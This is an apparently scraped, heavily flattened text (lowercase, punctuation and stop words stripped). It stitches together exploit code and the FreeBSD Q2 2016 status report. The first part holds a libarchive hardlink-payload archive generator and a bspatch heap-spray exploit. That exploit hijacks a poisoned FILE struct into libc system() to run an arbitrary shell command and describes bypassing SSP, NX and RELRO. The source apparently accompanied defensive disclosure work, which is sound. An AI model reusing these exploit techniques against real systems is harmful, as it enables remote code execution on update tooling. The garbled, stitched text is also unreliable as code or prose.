hardlink payload supported tar format pax ustar gnutar set hardlink libarchive zero size field creation simply create regularfile entry patch archive disk via patcharchive done archiveentrysetctime ae archiveentrysethardlink ae linkname archivewriteheader ae fd open file ordonly len read fd buf sizeof buf archivewritedata buf sizet len close fd archiveentryfree ae archivewriteclose archivewritefree patcharchive archive linkname static void patcharchive char archive char linkname extended header extended body checksum offset static const long patchoffset file fp unsigned char cp unsigned long checksum fp fopen archive rb fseek fp patchoffset seekset fscanf fp lo checksum entry type checksum cp unsigned char linkname linkname char cp checksum cp fseek fp patchoffset seekset fprintf fp c checksum linkname fclose fp int main int argc char argv argc fprintf stderr usage archive file pathname linknamen argv fprintf stderr tarchive output malicious archive heren fprintf stderr tfile file containing overwrite datan fprintf stderr tpathname archiveentry pathnamen fprintf stderr tlinkname archiveentry linknamen fprintf stderr use linkname n return exitfailure makearchive argv argv argv argv return defense posix requires hard link point extracted item though possibility hard link use previously extracted symlink target escape extraction directory borne mind seems good idea excise datapayload functionality mandatory posix feature seem widely supported anyway look line beginning else r filesize createfilesystemobject libarchivearchivewritediskposixc bspatch description bspatch utility executed verification freebsdupdate portsnap contains memorycorruption vulnerability allows highly reliable exploitation across system build defeating exploitmitigation feature found freebsd demonstration exploit contains copious comment providing detailed analysis vulnerability defense patch hardens bspatch note patch additional check added original check remain hence patched bspatch observably least secure original check may practically even necessary always immediately obvious check serve purpose selfdocumented constraint also guard future change aggressive compiler optimization etc check could made earlier cost clarity assumed empty file pathological assumed ctrl permitted negative ctrl ctrl check ssizemax rather sizemax consistent original code provide greater clarity fully signed comparison include syscdefsh fbsdid freebsd include asserth include bzlibh include limitsh include stdinth include stdlibh include stdioh include stringh bzfile int int fd ssizet oldsize newsize ssizet bzctrllen bzdatalen offt oldsize newsize offt bzctrllen bzdatalen uchar header buf uchar old new offt oldpos newpos offt lenread offt assert offmax argc errx usage oldfile newfile patchfilen argv open patch file bzctrllenofftin bzdatalenofftin newsizeofftin bzctrllen bzdatalen newsize errx corrupt patchn bzctrllen bzctrllen bzdatalen offmaxbzdatalen newsize newsize ssizemax errx corrupt patchn close patch file reopen via right place fclose f errx fdopen argv oldsizelseek seekend oldmalloc null oldsizelseek seekend oldsize ssizemax oldmalloc oldsize null lseek seekset read fd old oldsize oldsize close fd err argv newmalloc null err null newmalloc newsize null err null newpos newsize bzstreamend errx corrupt patchn ctrl offtin buf sanitycheck newposctrl newsize errx corrupt patchn ctrl ctrl intmax newpos offmaxctrl newposctrl newsize errx corrupt patchn read diff string read diff string arg converted int lenread new newpos ctrl lenread ctrl bzok bzstreamend errx corrupt patchn sanitycheck oldpos offmaxctrl errx corrupt patchn add old data diff string ctrl oldposi oldposi oldsize oldposctrl sanitycheck newposctrl newsize errx corrupt patchn ctrl ctrl intmax newpos offmaxctrl newposctrl newsize errx corrupt patchn read extra string read extra string arg converted int lenread new newpos ctrl lenread ctrl bzok bzstreamend errx corrupt patchn sanitycheck ctrl oldpos offminctrl oldpos offmaxctrl errx corrupt patchn adjust pointer newposctrl oldposctrl clean read demonstration bspatch demo exploit version bspatch utility executed verification freebsdupdate portsnap freebsd countermeasure defeated ssp yes heapbased dep yes singleaddress entropy via native nx dual heap spray via paepaetables relro full yes relroprotected section untouched aslr aslr stock freebsd yet cc bsx bsxc script included syssh patch generation take min modest hardware bsx patch echo boom file cp binls heapspray decompression take sec bspatch l new patch boom bspatch corrupt patch binsh grab local system address argv libcinfo ldd f ot pt xn bspatch grep libc libcp echo libcinfo cut libcb echo libcinfo cut sed libcs nm pd libcp grep system cut tr af af echo libcb libcs bc sed include systypesh include asserth include bzlibh include fcntlh include stdinth include stdioh include stdlibh include stringh include unistdh typedef struct unsigned char buf sizet len badpatchblock typedef struct const char cmd systemaddr unsigned char header badpatchblock cblock badpatchblock dblock badpatchblock eblock badpatch static void unsigned char buf static int bit static void unsigned char sgnmagbuf static int badpatchgenheader badpatch bp static int badpatchgencblock badpatch bp static int badpatchgendblock badpatch bp static int badpatchgeneblock badpatch bp badpatch badpatchcreate systemaddr const char cmd void badpatchserialize badpatch bp int fd void badpatchdestroy badpatch bp static void unsigned char buf int buf static int bit assert bit bit return bit bit patch use signmagnitude representation static void unsigned char sgnmagbuf int sgn assert sgn sgnmagbuf sgn sgnmagbuf static int badpatchgenheader badpatch bp memcpy bp header bp cblocklen bp header bp dblocklen bp header claim newfile size byte spray byte data main loop terminate prematurely additional byte used dblock junk write bspatch additional byte remain unused bp header return static int badpatchgencblock badpatch bp heap profile ignoring base chunk consists entirely unfreed largeclass allocation page contiguous hhh page contains arenachunkt header page patch cblock stdio buffer page patch cblock bzfile struct page patch cblock dstate struct page patch dblock stdio buffer page patch dblock bzfile struct page patch dblock dstate struct page patch eblock stdio buffer page patch eblock bzfile struct page patch eblock dstate struct page patch cblock bwt tvector block data page patch dblock bwt tvector block data page patch eblock bwt tvector block data ooo page oldfile buffer nt necessarily control plenty room current chunk vast majority case nnn page newfile buffer control positioned behind using compression bump tv page count buy little way force jemalloc position newfile buffer behind useful heap data manipulate newpos within bspatch get data execution hijack via poisoned file handle internal cblock bzfile struct struct offset nnn rlimitasrlimitvmem unlimited default first purpose hugeclass allocation force new chunk given highly deterministic behavior call mmap null fixed size stdio buffer arenachunkt header previous chunk allows u calculate reliable value independent size oldfile buffer heap noise subtract page hhh page get value nnn negated becomes delta value delta value end bspatch newpos variable arithmetic acrobatics static const delta static unsigned char tuples unsigned len len bp cblockbuf malloc len perror badpatchgencblock return vulnerable code bspatchc comment removed newpos newsize lenread buf lenread bzok bzstreamend errx corrupt patchn ctrl offtin buf newposctrl newsize errx corrupt patchn lenread new newpos ctrl lenread ctrl bzok bzstreamend errx corrupt patchn ctrl oldposi oldposi oldsize new newposi old oldposi newposctrl oldposctrl newposctrl newsize errx corrupt patchn lenread new newpos ctrl lenread ctrl bzok bzstreamend errx corrupt patchn newposctrl oldposctrl control offt value ctrl want newpos contain delta value negative value problem first problem placing delta ctrl ctrl easily bypass bspatch sanity check check negative value resulting immediate return caller termination note however function expects int offt value get truncated int long offt value signbit clean int use offt value like get desired delta value use following equation based offt value delta bit set delta bit clear second problem offt value positive actually deliver much data satisfy lenread check compression help second purpose allocation however offt value negative check easily satisfied simply ensure bzok bzstreamend return avoid termination fact exploit avoid deliver inttruncated delta bit clear byte data nowcramped address space sequence cblock tuples event loop iteration ctrl effectively noop using ctrl avoids slow somewhat destructive forloop ctrl sanity check ok signbit clean int satisfying check heapsprays byte data eblock lenread check ok bump newpos ctrl another noop loop iteration deltasignbitclear ctrl deltasignbitclear negative value sanity check ok negative value signbit clean int satisfying check read junk byte dblock returning bzstreamend lenread check ok negative value bzstreamend avoids termination kill stream ca nt repeatedly use trick forloop avoided negative value drop newpos desired delta value per equation given earlier ctrl sanity check ok negative value read byte data eblock corrupts cblock management data beginning new delta lenread check ok bump newpos insignificant ctrl another noop loop iteration try read data cblock via hijack chain triggered corrupted management data tuples delta tuples tuples char bp cblockbuf len char tuples sizeof tuples bzok fputs badpatchgencblock compression failuren stderr return bp cblocklen len return static int badpatchgendblock badpatch bp static unsigned char junk unsigned len len bp dblockbuf malloc len perror badpatchgendblock return char bp dblockbuf len char junk sizeof junk bzok fputs badpatchgendblock compression failuren stderr return bp dblocklen len return static int badpatchgeneblock badpatch bp third purpose allocation dual heap spray effectively reduces exploitation entropy single system address consistent across build lowspray pattern fake file struct allowing hijack occur within libc sread libc myfeof fgetc sgetc srget srefill sread fp read fp cookie buf n use cookie allows easy argument passing system straight heap without need rop gadget important file field r good enough sgetc macro call srget sgetc p p r srget p int p p also pattern wo nt work nt want read field positive system address overloaded r field flag satisfies ferror ensures smooth sailing srefill srw set serr seof srd swr slbf snbf unset bfbase ensures smooth sailing srefill cookie highspray address passed system read placeholder system address may seem hairy way thing go wrong desired entry point virtual certainty reason explained alternative hijack via bzfree opaque bzstream requires much heap management minimally restoring bwt tvector pointer thus increasing exploitation entropy two absolute address instead one static const unsigned long lospraysystemaddroff static unsigned char lospray static unsigned char hispray static unsigned char bzfilepoison unsigned char fullpayload unsigned long unsigned len bp systemaddr lospray lospraysystemaddroff highspray pattern sh c command string drop top space nul termination stay well clear repeat pattern around extremely unlucky hit space memset hispray sizeof hispray strcpy char hispray sizeof hispray strlen bp cmd bp cmd poison bzfile internal file handle lowspray address seems arbitrary tactically sound jemalloc chunk mean starting address congruent modulo address ie lowspray pattern begin anew given hugeclass allocation lack arena overhead begin chunk boundary obviously aesthetically pleasing offset file struct byte pattern remainder poisoning buffer consists nuls want bzf strmavailin kick execution chain given earlier beginning myfeof bzf strmavailin myfeof bzf handle memcpy bzfilepoison ugh interface ignore compiler posix sane uintmax len bp eblockbuf malloc len perror badpatchgeneblock return fullpayload malloc sizeof bzfilepoison perror badpatchgeneblock return memset fullpayload sizeof bzfilepoison sizeof lospray sizeof lospray memcpy fullpayload lospray sizeof lospray sizeof hispray sizeof hispray memcpy fullpayload hispray sizeof hispray memcpy fullpayload bzfilepoison sizeof bzfilepoison char bp eblockbuf len char fullpayload sizeof bzfilepoison bzok fputs badpatchgeneblock compression failuren stderr free fullpayload return bp eblocklen len free fullpayload return badpatch badpatchcreate systemaddr const char cmd badpatch bp bp malloc sizeof bp perror badpatchcreate return null bp systemaddr systemaddr bp cmd cmd bp cblockbuf null bp dblockbuf null bp eblockbuf null badpatchgencblock bp badpatchgendblock bp badpatchgeneblock bp badpatchgenheader bp badpatchdestroy bp return null return bp void badpatchserialize badpatch bp int fd write fd bp header sizeof bp header write fd bp cblockbuf bp cblocklen write fd bp dblockbuf bp dblocklen write fd bp eblockbuf bp eblocklen void badpatchdestroy badpatch bp bp bp cblockbuf free bp cblockbuf bp dblockbuf free bp dblockbuf bp eblockbuf free bp eblockbuf free bp int main int argc char argv int fd const char filename cmd systemaddr badpatch bp argc fprintf stderr usage filename systemaddr cmd n argv fprintf stderr tfilename output malicious patch file heren fprintf stderr tsystemaddr system address target buildn fprintf stderr default crash demo n fprintf stderr tcmd sh c command stringn fprintf stderr default date n return exitfailure filename argv systemaddr argc strtoul argv null cmd argc argv date fd open filename owronly ocreat otrunc perror open return exitfailure bp badpatchcreate systemaddr cmd fputs patch creation failedn stderr close fd return exitfailure badpatchserialize bp fd badpatchdestroy bp close fd return
529,Lobsters,freebsd,FreeBSD,FreeBSD Q2 2016 status report,https://www.freebsd.org/news/status/report-2016-04-2016-06.html,freebsd status report,introduction irc freebsdorg koobs freebsdorg eadler freebsdorg group registration page irc cloak vladfbsd acheronmediacom koobs freebsdorg bugmeister freebsdorg state open task freebsdorg portmgrsecretary freebsdorg portmgr freebsdorg core freebsdorg planetfreebsdorg deb freebsdfoundationorg freebsdfoundationorgdonate http wikifreebsdorgtransportprotocols http wikifreebsdorgdtrace http wwwfreebsdfoundationorgfreebsdhowtoguides http wwwfreebsdfoundationorgfreebsd http wwwfreebsdfoundationorgwhatwedoresearch http wwwfreebsdfoundationorgaboutbrandassets http http teachbsdorg http wwwfreebsdfoundationorgbloghostingpartnerspotlightnyiattheheartoffreebsd http wwwfreebsdfoundationorgblogmorefromthefreebsdfoundationontheprojectspartnershipwithmicrosoft http http wwwnetwaysdeindexphp http wwwcommunityleadershipsummitcomschedule http kib freebsdorg pr bug wjw digiwarenl open task eric metricspacenet branch github efize branch important open task kib freebsdorg emaste freebsdorg open task freebsdorg mmacy nextbsdorg freebsdarch mailinglist jmcneill freebsdorg manu freebsdorg review review review open task sepherosa gmailcom honzhan microsoftcom decui microsoftcom kyliel microsoftcom announced bsdcan website pr pr hyperv azure bz freebsdorg open task andrew freebsdorg emaste freebsdorg reproduciblebuildsorg website open task jhb freebsdorg lucapizzamiglio gmailcom open task rafaelespindola gmailcom dccitaliano gmailcom emaste freebsdorg open task tz freebsdorg freebsdgnome freebsdorg open task sergeykozlov intelcom open task tz freebsdorg freebsdorg mirror vaultcentosorg mirrorcentosorg gstreamerfreedesktoporg peoplefreebsdorg kde freebsdorg qbs tz freebsdorg news home status home,introductionnow available model freebsd project status report quarter brings several exciting improvement previous model enhancement different team new feature like robust mutexes support full disk encryption geli find expanded graphic support chipset window manager level ongoing development many pending featuresperhaps exciting hood find brandnew core teamdo nt wait take freebsd spin w lucasplease submit status report third quarter october contact irc admin team irc freebsdorg contact kubilay kocak koobs freebsdorg contact eitan adler eadler freebsdorg freebsd irc admin team manages freebsd project irc presence freenode irc network looking registration ongoing management channel within official namespace freebsd liaising freenode staff allocating freebsd hostmask cloak user general user support order facilitate constructive positive environment member freebsd community irc admin past month established consolidated consistent baseline respect management channel freenode report summary happened far thing come activity completed last quarter registered freebsd group contact gc freenode staff information mean see group registration page created freebsd nickserv account assign primary ownerfounder freebsd namespace channel primary channel ownedfounded generic freebsd account owned managed freebsd project created service irc component bugzilla change request issue report obtained report registered freenode channel matching freebsd namespace assessed list current ownership activity status assigned freebsd user cloak user requesting information see irc cloak obtained report nickname account existing freebsd user cloak liaised freenode staff upcoming change freebsd channel goal next quarter complete transfer founder ownership freebsd channel existing channel creator project member others contacted using known contact information contact information set registered nickserv account order initiate transfer channel freebsd project contact information existing channel owner obtained response received suitable period time elapsed irc admin complete ownership transfer freenode staff deregister defunct inactive freebsd channel channel visible sign activity based last active time registered owner last seen deprecated alternative channel way ownership transferred deregistered channel sunset period may suitable channel topic set optionally forwarding channel informing user change including support contact information create document baseline procedure guideline include community user guideline code conduct operator moderator guideline expectation abuse reporting dispute resolution guideline procedure delegation channel management standardize recreate channel access list existing access list user permission freebsd channel remain state prior freebsd group registration consolidation reassignment freebsd project needed order ensure consistent user community experience official freebsd channel going forward access list channel created ground user existing access channel may irc admin team discretion provided opportunity reapply access subject condition term guideline may appropriate determine method informing project member community future change irc service procedure policy determine method designate existing channel founder channel manager similar update channel list wiki distinguish official unofficial channel establish consistent mode entry message topic channel user invited join freebsdirc freenode irc network irc admin team welcome idea contructive criticism feedback freebsd project improve service experience provides community vast majority broader community interacts freenode irc network freebsd developer presence need significantly improved many opportunity increasing amount quality interaction freebsd user developer term developer keeping finger pulse community encouraging cultivating greater contribution project long term critical strong developer presence amongst user irc admin would like call developer join freebsd freenode channel help support presence freebsd giant whose shoulder future contributor stand important force contact vladimir krstulja vladfbsd acheronmediacom contact kubilay kocak koobs freebsdorg contact bugmeister bugmeister freebsdorg since triage team introduced report working following three major aspect issue triage recruiting educating user assist issue triage identifying problem area especially fresh eye perspective revealing issue immediately obvious contributor experience proposing change improve issue triage process effort almost exclusively focused issue port package component easiest starting point category like base system require knowledge experience problem content workflow time rodrigo inactive due lack available time vladimir unable commit enough time first quarter year provided active contribution second became obvious issue triage team must concentrate additional recruitment coming quarter last two quarter several problem identified formulated solution published upcoming wiki page summary issue given issue triage defined ensure issue summarized classified assigned appropriate people time consuming bugzilla automation autoassign help insufficient triage process extended include track issue entire life resolution time effort required grows exponentially fortunately many thing community minimum effort help greatly part recruitment education process educating user properly treat issue issue interact order maximize efficiency issue tracking problem resolution various timeouts inadequate example maintainer timeout long differentiate class issue nonsecurity security timeout timeouts covered assignee timeouts issue assigned followup activity another example timeout additional information requested never provided recommending several change documenting wiki partially consequence inadequate timeouts inadequate ability efficiently track issue entire lifecycle great number issue open long identified several class issue document solution near future bugzilla perfect time hinder ability properly track issue clearly accurately order resolve quickly however changing bug tracking software tremendous effort instead recommend technical workflow improvement order improve user experience much possible example identified additional saved search help track quickly find issue category importantly state another example ensuring various flag keywords unambiguous well understood instance patch patchready often misunderstood misapplied issue statistic lacking next quarter intend change statistic help provide insight potential bottleneck inform prioritization improvement issue tracker workflow open task recruit suitable triagers team committers community membersgather present interesting statistic next reportset wiki page identified problem recommended guideline policiesfind common use pattern add saved search bugzilla contact freebsd release engineering team freebsdorg freebsd release engineering team responsible setting publishing release schedule official project release freebsd announcing code freeze maintaining respective branch among thing freebsd release engineering team completed cycle late april led marius strobl release one week behind original schedule accommodate lastminute critical issue essential fix final release freebsd cycle started late may one month behind original schedule schedule slip primarily accommodate effort packaging freebsd base system pkg utility however work progressed became apparent many outstanding issue result packaged base beta feature goal promoting firstclass feature expected provision made ensure seamless transition older supported release despite fact packaged base going prime feature freebsd release engineering team would like thank everyone tested provided patch provided idea feedback case shot foot due bug project sponsored freebsd foundation contact rené ladan portmgrsecretary freebsdorg contact freebsd port management team portmgr freebsdorg branch port tree currently contains port pr count around around unassigned activity dropped somewhat commits made active committers almost pr closed last quarter last quarter added two new committers ben wood torsten zühlsdorff tz commit bit taken safe keeping management side mat took role cluster admin liaison erwin decided step portmgr rene took role port manager secretary culot change made lot work done modernizing infrastructure port tree introducing new us knob one new keyword splitting larger target bsdportmk separate script total expruns validate infrastructure change package update furthermore check added quality assurance phase poudriere check missing indirect dependency advancement made reproducable package build noticeable package update firefox firefox esr thunderbird chromium ruby ruby gem pkg gmake kde python libc binutils behind scene antoine made sure exprun package builder kept uptodate bdrewery worked automating hardening package building infrastructure bsdcan mat worked various item including updating porter handbook portmgr held meeting discus various item contact freebsd core team core freebsdorg highlight core second quarter regular biennial election new core team core would like thank dagerling smørgrav glen barber running vote despite initially slow uptake nomination fourteen candidate eventually stood including four incumbent member core ninth freebsd core team john baldwin baptiste daroussin allan jude ed maste kris moore george v nevilleneil benedict reuschling benno rice hiroki sato new core team would like thank departing member many year service member stepping gavin atkinson gleb smirnoff david chisnall robert watson peter wemm second notable achievement quarter successful conclusion issue core agenda many year creation planetfreebsdorg freebsd project finally official blog aggregation service core spent significant amount time reviewing licensing ensuring freebsd source remains unencumbered onerous license term quarter involved approving adrian chadd plan import licensed code allowing bwn built loadable module support networking required confirmation license term latest dummynet aqm patch acceptable variant bsd license suitable use freebsd base system core applied received projectwide license use jetbrains static analysis tool suite behest mathieu previot another core important function ensure good relation amongst developer end member core provided oversight backingout disputed blacklistdrelated patch openssh acted smooth ruffled temper quarter saw usual quota gentle reminder avoid intemperate language counterproductive behavior core take immediate action death threat appearing mailing list culprit immediately banned mailing list reported email service provider person similarly removed identified rejoined different alias activity included working university authority attempt get documentation certifying prospective gsoc student legally allowed work freebsd code foreigner enrolled usa university issue eventually solved student returning home summer working issuing guidance policy around forced commits trivial change used mean correcting commit message case correct approach revert commit recommit correct message ensures continuing usefulness svn blame approving delay planned introduction packaged base confirming require change new support policy introduced quarter four new commit bit awarded none taken please welcome emmanuel vadot landon fuller mike karels eric badger new src committers yes mike karels member csrg berkeley coauthor design implementation unix operating system contact deb goodkin deb freebsdfoundationorg freebsd foundation c nonprofit organization dedicated supporting promoting freebsd project community worldwide funding come individual corporate donation used fund manage development project conference developer summit provide travel grant freebsd developer foundation purchase hardware improve maintain freebsd infrastructure publishes freebsd white paper marketing material promote educate advocate freebsd project foundation also represents freebsd project executing contract license agreement legal arrangement require recognized legal entity highlight help freebsd last quarter fundraising effort work funded donation spending budget raised far financial report posted august see need donation continue supporting freebsd current level please consider making donation freebsdfoundationorgdonate o improvement foundation improves freebsd funding software development project approved proposal submission process internal software developer staff member two foundationfunded project continued last quarter one project improve stability vnet network stack virtualization infrastructure second phase two port project foundation staff member responsible many change quarter kostik belousov accomplished following work last quarter implemented robust mutexes support part ongoing effort bring threading library posix compliance feature completeness documented kernel interface used threading library produced almost page technical text completed committed elimination pvhgloballock pmap removed hot contested lock fixed bug help keep freebsd stable reliable edward napierala accomplished following work last quarter added filesystem thoughput limit rctl committed iser initiator support added support rerooting nfs added iscsictl e make possible enable disable iscsi session ed maste project development director accomplished following work last quarter investigated state reproducible build port tree work progress address issue updated elf tool chain tool bug fix improved handling malformed input investigated using lld linker llvm family link freebsd base system reported tested patch issue found also managed development project investigated fixed number bug lastly imported llvm libunwind prepared use freebsd investigated reviewed blacklistd proposal patch george nevilleneil continued hosting biweekly transport conference call note http wikifreebsdorgtransportprotocols biweekly dtrace conference call note http wikifreebsdorgdtrace ed continued facilitating biweekly graphic call coordinate effort driver graphic stack work several project described elsewhere quarterly report release engineering foundation employee release engineer glen barber worked closely marius strobl completed april glen also merged releasepkg branch though beta feature lastly release engineering team started cycle find release engineering team status entry report getting started freebsd project hired summer intern freebsd linux command line operating system experience figure install use freebsd writing easytofollow howto guide help make new user experience straightforward positive also submitting bug report problem appropriate channel check first howto guide http wwwfreebsdfoundationorgfreebsdhowtoguides freebsd advocacy education large part effort dedicated advocating project includes promoting work done others freebsd producing advocacy literature teach people freebsd help make path starting using freebsd contributing project easier attending getting freebsd contributor volunteer run freebsd event staff freebsd table give freebsd presentation work last quarter support freebsd advocacy included creating freebsd page website promote freebsd derivative project showcase freebsd user http wwwfreebsdfoundationorgfreebsd promoting freebsd research creating research page site conference handout http wwwfreebsdfoundationorgwhatwedoresearch created guideline repository using project foundation logo http wwwfreebsdfoundationorgaboutbrandassets help showcase freebsd contributor published two new face freebsd story michael lucas http kris moore http published marchapril mayjune issue freebsd journal participated editorial board work kirk mckusick wrote feature article fast filesystem marchapril issue team member helped review edit journal article also published monthly newsletter highlight work done support freebsd tell upcoming event provide information keep loop support freebsd project community george nevilleneil robert watson continued teaching developing open source freebsd teaching material teachbsdorg launched first hosting partner spotlight showcase project partnership nyi http wwwfreebsdfoundationorgbloghostingpartnerspotlightnyiattheheartoffreebsd worked microsoft get freebsd onto azure http wwwfreebsdfoundationorgblogmorefromthefreebsdfoundationontheprojectspartnershipwithmicrosoft foundation quoted cavium thunder press release http george worked arm coordinate upcoming arm partner meeting cambridge conference event freebsd foundation sponsor many conference event summit around globe event bsdrelated open source technology event geared towards underrepresented group support freebsdfocused event help provide venue sharing knowledge work together project facilitate collaboration developer commercial user help provide healthy ecosystem support nonfreebsd event promote raise awareness freebsd increase use freebsd different application recruit contributor project april benedict reuschling helped organize run hackathon essen april attended open source datacenter conference berlin allan jude give talk interesting thing zfs highlighted openzfs feature well work freebsd http wwwnetwaysdeindexphp promoted freebsd deb goodkin dru lavigne attended community leadership summit austin may http wwwcommunityleadershipsummitcomschedule deb promoted freebsd usenix atc june denver co team attended bsdcan ottawa developer summit held annual board meeting vote officer board member work strategic planning u attended developervendor summit kirk mckusick presented brief history bsd fast filesystem http ed maste gave presentation reproducible build freebsd george helped run vendor summit sponsored five freebsd contributor attend bsdcan legalfreebsd ip foundation owns freebsd trademark responsibility protect continued review request grant permission use trademark freebsd community engagement launched first community survey purpose get input community use freebsd like see foundation support input help u determine direction support project anne dickison marketing director overseeing effort rewrite project code conduct help make safe inclusive welcoming community stuff last quarter purchased server reside nyi improve continuous integration tool within project two facetoface board meeting last quarter work strategic planning identify area project support also held first ever staff retreat boulder colorado give small team opportunity work together person hired sabine percarpio administration manager helping u manage donation accounting travel grant application handle question come foundation run organization smoothly contact konstantin belousov kib freebsdorg interim report technical state work towards aslr support freebsd base system proccontrol utility written manage query aslr enforcement perprocess basis required analyzing aslr failure specific program utility leverage procctl interface added previous version patch bug fix aslr setting reset systemwide default whenever setuid binary executed command syntax proccontrol traceaslr q enabledisable p pid command possible argument specifies trace mode control debugger attachment q query state specified mode process pid specified p option toggle feature given process command specified inherits applied setting proccontrol instance start build program aslr disabled use proccontrol aslr disable make port exprun done aslr tuned aggressive setting result found pr case study lisp sbcl interesting case illustrates several point much smaller jdk build system easier work code provides non clike language runtime utilizes lot corner case make nonstandard us vm system least point view typical c programmer sbcl compiles lisp form machine native code manages arena object precompiled lisp runtime mapped core file sbcl relies operating system c runtime initial load lisp need functional libc issue many system call including syscalls well dynamic loader end result unfixed mmap call startup runtime interfering mapfixed mmaps loading core file private arena hardcoded exist fixed address happens work default address map changed often sbcl choice base address evolved work significant distortion standard map result sbcl mmap mapfixed request attempting override memory allocator freebsd us mapexcl flag mmap must used form mapfixedmapexcl cause mmap fail requested range already used tried force mapfixed request sbcl implicitly set mapexcl go well since sbcl sometimes preallocates region later use mapfixed mapexcl mapping failed dumping process ldb linux detected kernel asrandomization mode initial sbcl runtime set personality nonrandom reexecs might solution freebsd well aslr patch committed procctl knob officially available sbcl still issue linux even reexec aggressive randomization pax patch applied seen bug case study emacs emacs build procedure involves loading temacs image compiled emacs lisp file dumping memory create image content preloaded order reduce startup time recent emacs source seem generally avoid mapfixed except situation emacs use flag carefully check selected region busy fact emacs would benefit using mapexcl tried several run building emacs running dumped binary able reproduce issue seems code improved enough tolerate aslr linux netbsd without turning opinion reasonable fight issue kernel fixable kernel side procctl interface proccontrol utility provide override needed automated conclusion set port built aslr turned limited fluid however expruns may reliably uncover problem due randomization seen emacs example route enable aslr default nonaggressive setting port framework provide option like aslrunsafeyes spawn proccontrol aslr disable make build stage unsafe port user would still need aware proccontrol order run resulting binary wrapper script provided recommended approach flag elf binary mark compatible nonstandard layout free user use proccontrol still requires patching application build process upstreaming change approach also useful outside context aslr however mechanism yet ready developing larger work aslr project sponsored freebsd foundation contact willem jan withagen wjw digiwarenl ceph distributed object store filesystem designed provide excellent performance reliability scalability provides following feature object storage ceph provides seamless access object using native language binding radosgw rest interface compatible application written swift block storage ceph rados block device rbd provides access block device image striped replicated across entire storage cluster file system ceph provides posixcompliant network filesystem aim high performance large data storage maximum compatibility legacy application started looking ceph using hast carp ggate meet requirement primary goal ceph run storage cluster zfs storage node client run bhyve rbd disk stored ceph freebsd build process build tool ceph however rbddependent item work since freebsd yet provide rbd support since last quarterly report following progress made switching using cmake automake result much cleaner development environment better test output change found wipwjwfreebsdcmake branch throttling code overhauled prevent live lock mainly occur freebsd also manifest linux test fixed one occasion able complete full test suite without error used compile buildtest ceph clang toolset need least version clang available capability required compile everything setup get thing running freebsd install bash link bin requires root privilege sudo pkg install bash sudo ln usrlocalbinbash binbash build ceph git clone http githubcomwjwithagencephgit cd ceph git checkout wipwjwfreebsdtests dofreebsdcmakesh deps deps argument needed initial installation pull necessary dependency omitted subsequent build cmake used build ceph freebsd old method using automake longer used part yet included rbd rados block device currently implemented linux kernel used userspace implementation possible ggated could used template since provides functionality userspace counterpart bluestore freebsd linux different aio api need bridged discussion aiocancel working device type freebsd cephfs cython try access internal field struct dirent fails compile test verify correct functionality feature also excluded test suite test yet included cephdetectinitruntoxsh current implementation know anything freebsd rc system test make use nosetests really work since nosetests usrbin calling usrbinenv nosetests work freebsd testpybindtestcephargparsepy testpybindtestcephdaemonpy open task current foremost task get test suite complete without errorsbuild automated test platform build cephmaster freebsd report result back ceph developer increase maintainability freebsd side thing developer signaled using linuxisms compile run freebsd ceph several project support jenkins teuthology palpito even compile loop report build data static webpage good startrun integration test see freebsd daemon work linux ceph platformget currently excluded python test workcompile test userspace rbd rados block device investigate inkernel rbd device could developed akin ggateinvestigate keystore currently prevents building cephfs partsintegrate freebsd etcrcd init script ceph stack testing running ceph production machine contact eric mccorkle eric metricspacenet efi bootloader undergone considerable refactoring make use efi api filesystem code eliminated single codebase filesystems serf loader codebase organized around efi driver model possible export filesystem implementation standalone efi driver without much effort loader refactored utilize efisimplefilesystem interface loader accomplished dummy filesystem driver translation layer loader filesystem interface efisimplefilesystem reverse translation layer allows existing filesystem driver function efi driver efi refactoring exists branch github additionally geli support added using efi refactoring allows booting geliencrypted filesystem note efi system partition contains must plaintext msdosfs partition patch add intake buffer crypto framework allows injection key directly loaded kernel without need pas argument environment variable patch us intake buffer efi geli support legacy bios geli support still us environment variable efi geli support depends efize branch patch tested used able handle use early adopter note loaderpath variable changed bootloadertst facilitate safe testing important encrypted filesystem patch error potentially leave data inaccessible strongly recommended use following procedure testing back data forget back data install efi shell efi system partition esp install patched esp something like install patched loader bootloadertst machine create geli partition outside normal boot partition first try booting make sure properly handle encrypted partition copy boot environment including patched loader encrypted partition use loader prompt load kernel encrypted partition try switching encrypted main partition everything else working open task testing neededthe code need review style normalization must occur go freebsd contact konstantin belousov kib freebsdorg contact ed maste emaste freebsdorg processshared lock implemented posix thread implementation libthr major feature lacking posix compliance robust mutexes robust mutexes allow application detect theoretically recover crash occur modifying shared state supported model protect shared state pthreadmutex crash detected thread termination owning mutex thread might terminate alone could killed due termination containing process robust attribute applicable processprivate shared mutexes application must specifically modified handle recover failure pthreadmutexlock function may return new error eownerdead indicates previous owner lock terminated still owning lock despite returning nonzero value lock granted caller simplest form application may detect error refuse operate persistent shared data recovered manual reinitialization sophisticated application could try automatically recover condition case pthreadmutexconsistent must called lock unlocking however recovery considered hard still even detection inconsistent shared state useful since avoids corruption random fault affected application curious unexpected interface used widely reallife application utilizes samba using samba updated freebsd base uncovered minor bug freebsd robust mutex implementation samba believed libthr freebsd posixcompliant major feature work planned look inlining lock structure remove overhead improve performance library implementation robustness feature consisted making small change lock unlock path libthr kernumtxc literally required reading code dealing mutexes condition variable something wanted help future developer end help ed maste man page umtx thr syscalls written added base system documentation set project sponsored freebsd foundationopen task use implementation realword application report issue contact freebsd graphic team freebsdorg contact matthew macy mmacy nextbsdorg port tree mesa updated next major release release candidate ready testing development tree gsoc project able connect dev entry sysctl node making progress fruitful discussons freebsdarch mailinglist kiloreux finished design implementing solution gsoc project libdevq abandoned intel gpus including unreleased kaby lake supported driver updated soon updating driver requires updating xorg turn blocked nvidia update several problem remain solved instance visual artifact appear varying frequency depending workload particular note lack redraw window partially covered menu uncovered webgl demo sometimes fail due recoverable render ring hang still known stability issue processor prior sandy bridge matt macy hoping able diagnose first two issue along others updating linux support point intel gpu tool work freebsd radeon amdati driver updated gcn tested x work due apparent issue user library support x recognize km driver report capable opencl benchmark clpeak fails drmttm may fact issue underlying support amdgpu amdati driver updated gcn higher km driver load attache discrete gpus though problem still exist carizzo apu x start due unimplemented function libdrm koop mast actively working fixed soon none required patch srcsys committed time freebsd although plan ultimately make linuxkpi drm radeon amdgpu update available port likely happen development slowed point economical backport freebsd svn time modern gpu support available pcbsd snapshot branch github contact jared mcneill jmcneill freebsdorg contact emmanuel vadot manu freebsdorg allwinner socs used multiple hobbyist devboards singleboard computer recently support socs received many update thesis task completed second quarter switch upstream dts soc support soc support switch new clock framework convert interrupt controller intrng ohci support 